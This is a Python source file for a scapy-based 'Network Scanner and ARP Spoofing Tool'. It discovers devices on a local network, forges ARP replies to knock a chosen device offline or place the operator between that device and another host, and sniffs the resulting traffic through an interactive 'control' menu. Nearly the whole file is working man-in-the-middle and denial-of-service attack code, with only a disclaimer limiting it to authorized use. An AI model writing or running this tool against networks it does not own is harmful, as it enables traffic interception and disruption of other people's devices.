#!/usr/bin/env python3
"""
Network Scanner and ARP Spoofing Tool
=====================================

This script provides comprehensive network scanning, device discovery,
ARP spoofing, and packet sniffing capabilities for network analysis.

Features:
- Network device discovery using ARP scanning
- Device information gathering (hostname, MAC vendor)
- ARP spoofing for network control
- Real-time packet sniffing
- Comprehensive logging

WARNING: This tool is for educational and authorized testing purposes only.
Only use on networks you own or have explicit permission to test.
"""

from scapy.all import ARP, Ether, srp, send, conf, sniff
import socket
import requests
import logging
import sys
import signal
import threading
import time
from datetime import datetime
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import AsyncSniffer

# Configure logging
logging.basicConfig(
    filename='network_scan.log', 
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

class NetworkScanner:
    """Main class for network scanning and ARP spoofing operations."""
    
    def __init__(self, interface="eth0"):
        self.interface = interface
        self.running = False
        self.sniffer = None
        self.spoofing_thread = None
        
    def scan_network(self, ip_range):
        """
        Scan the network for active devices using ARP requests.
        
        Args:
            ip_range (str): IP range to scan (e.g., "192.168.1.0/24")
            
        Returns:
            list: List of dictionaries containing device information
        """
        print(f"Scanning network range: {ip_range}")
        logging.info(f"Starting network scan for range: {ip_range}")
        
        try:
            # Create an ARP request packet
            arp = ARP(pdst=ip_range)
            # Create an Ethernet broadcast packet
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            # Stack them
            packet = ether/arp

            # Send the packet and capture the response
            result = srp(packet, timeout=3, verbose=0)[0]

            devices = []
            for sent, received in result:
                device_info = {
                    'ip': received.psrc, 
                    'mac': received.hwsrc,
                    'hostname': self.get_device_info(received.psrc)['hostname'],
                    'vendor': self.get_mac_vendor(received.hwsrc)
                }
                devices.append(device_info)
                logging.info(f"Device discovered: {device_info}")

            print(f"Found {len(devices)} active devices")
            return devices
            
        except Exception as e:
            print(f"Error during network scan: {e}")
            logging.error(f"Network scan error: {e}")
            return []

    def get_device_info(self, device_ip):
        """
        Get hostname information for a device IP.
        
        Args:
            device_ip (str): IP address of the device
            
        Returns:
            dict: Dictionary containing hostname information
        """
        try:
            hostname, _, _ = socket.gethostbyname_ex(device_ip)
            return {'hostname': hostname}
        except socket.herror:
            return {'hostname': 'Unknown'}
        except Exception as e:
            logging.warning(f"Could not resolve hostname for {device_ip}: {e}")
            return {'hostname': 'Unknown'}

    def get_mac_vendor(self, mac_address):
        """
        Get vendor information for a MAC address.
        
        Args:
            mac_address (str): MAC address to look up
            
        Returns:
            str: Vendor name or 'Unknown'
        """
        try:
            response = requests.get(f'https://api.macvendors.com/{mac_address}', timeout=5)
            if response.status_code == 200:
                return response.text.strip()
            else:
                return 'Unknown'
        except requests.RequestException as e:
            logging.warning(f"Could not get vendor for MAC {mac_address}: {e}")
            return 'Unknown'

    def kick_device_off_network(self, device_ip, router_ip, router_mac, device_mac):
        """
        Attempt to kick a device off the network using ARP spoofing.
        
        Args:
            device_ip (str): IP of device to kick
            router_ip (str): Router's IP address
            router_mac (str): Router's MAC address
            device_mac (str): Device's MAC address
        """
        try:
            # Create an ARP response packet
            arp_response = ARP(op=2, psrc=router_ip, pdst=device_ip, hwdst=device_mac)
            # Send the packet to the device
            send(arp_response, verbose=False)
            logging.info(f"Kicked {device_ip} off the network.")
            print(f"Kicked {device_ip} off the network.")
        except Exception as e:
            print(f"Error kicking device {device_ip}: {e}")
            logging.error(f"Error kicking device {device_ip}: {e}")

    def arp_spoof(self, target_ip, host_ip):
        """
        Perform ARP spoofing between target and host.
        
        Args:
            target_ip (str): Target device IP
            host_ip (str): Host device IP
        """
        try:
            # Enable IP forwarding
            conf.iface = self.interface
            conf.route.add(net=target_ip, gw=host_ip)
            conf.route.add(net=host_ip, gw=target_ip)

            print(f"Spoofing ARP packets for {target_ip}...")
            logging.info(f"Starting ARP spoofing: {target_ip} <-> {host_ip}")
            
            while self.running:
                try:
                    # Spoof ARP response to target device
                    arp_target = ARP(op=2, psrc=host_ip, pdst=target_ip)
                    send(arp_target, verbose=False)

                    # Spoof ARP response to host
                    arp_host = ARP(op=2, psrc=target_ip, pdst=host_ip)
                    send(arp_host, verbose=False)
                    
                    time.sleep(1)  # Send packets every second
                    
                except Exception as e:
                    logging.error(f"Error during ARP spoofing: {e}")
                    break
                    
        except Exception as e:
            print(f"Error setting up ARP spoofing: {e}")
            logging.error(f"ARP spoofing setup error: {e}")

    def start_arp_spoofing(self, target_ip, host_ip):
        """Start ARP spoofing in a separate thread."""
        self.running = True
        self.spoofing_thread = threading.Thread(
            target=self.arp_spoof, 
            args=(target_ip, host_ip)
        )
        self.spoofing_thread.daemon = True
        self.spoofing_thread.start()

    def stop_arp_spoofing(self):
        """Stop ARP spoofing."""
        self.running = False
        if self.spoofing_thread:
            self.spoofing_thread.join(timeout=2)

    def sniff_packets(self):
        """
        Sniff packets on the specified interface.
        
        Args:
            interface (str): Network interface to sniff on
        """
        print(f"Sniffing packets on interface {self.interface}...")
        logging.info(f"Starting packet sniffing on {self.interface}")
        
        def packet_callback(packet):
            try:
                if IP in packet:
                    ip_src = packet[IP].src
                    ip_dst = packet[IP].dst
                    protocol = packet[IP].proto
                    print(f"IP Packet: {ip_src} -> {ip_dst} (Protocol: {protocol})")
                elif ARP in packet:
                    arp_src = packet[ARP].psrc
                    arp_dst = packet[ARP].pdst
                    arp_op = packet[ARP].op
                    print(f"ARP Packet: {arp_src} -> {arp_dst} (Op: {arp_op})")
            except Exception as e:
                logging.warning(f"Error processing packet: {e}")

        try:
            self.sniffer = AsyncSniffer(iface=self.interface, prn=packet_callback)
            self.sniffer.start()
            
            while self.running:
                time.sleep(0.1)
                
        except KeyboardInterrupt:
            print("\nStopping packet sniffing...")
            self.stop_sniffing()
        except Exception as e:
            print(f"Error during packet sniffing: {e}")
            logging.error(f"Packet sniffing error: {e}")

    def start_sniffing(self):
        """Start packet sniffing in a separate thread."""
        self.running = True
        sniffing_thread = threading.Thread(target=self.sniff_packets)
        sniffing_thread.daemon = True
        sniffing_thread.start()
        return sniffing_thread

    def stop_sniffing(self):
        """Stop packet sniffing."""
        self.running = False
        if self.sniffer:
            self.sniffer.stop()
            self.sniffer.join()

    def display_devices(self, devices):
        """Display discovered devices in a formatted table."""
        if not devices:
            print("No devices found.")
            return
            
        print("\n" + "="*80)
        print("DISCOVERED DEVICES")
        print("="*80)
        print(f"{'IP Address':<15} {'MAC Address':<18} {'Hostname':<20} {'Vendor':<25}")
        print("-"*80)
        
        for device in devices:
            print(f"{device['ip']:<15} {device['mac']:<18} {device['hostname']:<20} {device['vendor']:<25}")
        
        print("="*80)

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully."""
    print("\nShutting down...")
    sys.exit(0)

def main():
    """Main function to run the network scanner."""
    # Set up signal handler for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)
    
    # Configuration - MODIFY THESE VALUES FOR YOUR NETWORK
    ip_range = "192.168.1.0/24"  # Change this to your network range
    router_ip = "192.168.1.1"    # Change this to your router's IP
    router_mac = "00:00:00:00:00:00"  # Change this to your router's MAC
    attacker_ip = "192.168.1.2"  # Change this to your attacker's IP
    interface = "eth0"  # Change this to your network interface

    print("="*60)
    print("NETWORK SCANNER AND ARP SPOOFING TOOL")
    print("="*60)
    print("WARNING: This tool is for educational purposes only!")
    print("Only use on networks you own or have permission to test.")
    print("="*60)
    
    # Initialize scanner
    scanner = NetworkScanner(interface)
    
    try:
        # Scan network
        print("Scanning network...")
        devices = scanner.scan_network(ip_range)
        scanner.display_devices(devices)
        
        if not devices:
            print("No devices found. Exiting.")
            return

        # Main control loop
        while True:
            print("\n" + "="*60)
            print("CONTROL OPTIONS:")
            print("1. Enter IP address to control (ARP spoof + sniff)")
            print("2. Enter 'scan' to rescan network")
            print("3. Enter 'list' to show devices again")
            print("4. Enter 'exit' to quit")
            print("="*60)
            
            choice = input("\nEnter your choice: ").strip().lower()
            
            if choice == 'exit':
                break
            elif choice == 'scan':
                print("Rescanning network...")
                devices = scanner.scan_network(ip_range)
                scanner.display_devices(devices)
            elif choice == 'list':
                scanner.display_devices(devices)
            elif choice.replace('.', '').isdigit():  # Check if it's an IP address
                ip_to_control = choice
                device_info = next((d for d in devices if d['ip'] == ip_to_control), None)
                
                if device_info:
                    print(f"\nControlling {ip_to_control}...")
                    print("Starting ARP spoofing and packet sniffing...")
                    print("Press Ctrl+C to stop and return to menu")
                    
                    # Start ARP spoofing and sniffing
                    scanner.start_arp_spoofing(ip_to_control, attacker_ip)
                    sniffing_thread = scanner.start_sniffing()
                    
                    try:
                        # Wait for user to stop
                        while True:
                            time.sleep(0.1)
                    except KeyboardInterrupt:
                        print("\nStopping ARP spoofing and sniffing...")
                        scanner.stop_arp_spoofing()
                        scanner.stop_sniffing()
                        if sniffing_thread:
                            sniffing_thread.join(timeout=2)
                else:
                    print(f"No device found with IP {ip_to_control}.")
            else:
                print("Invalid choice. Please try again.")
                
    except KeyboardInterrupt:
        print("\nShutting down...")
    except Exception as e:
        print(f"Unexpected error: {e}")
        logging.error(f"Unexpected error in main: {e}")
    finally:
        # Cleanup
        scanner.stop_arp_spoofing()
        scanner.stop_sniffing()
        print("Goodbye!")

if __name__ == "__main__":
    main()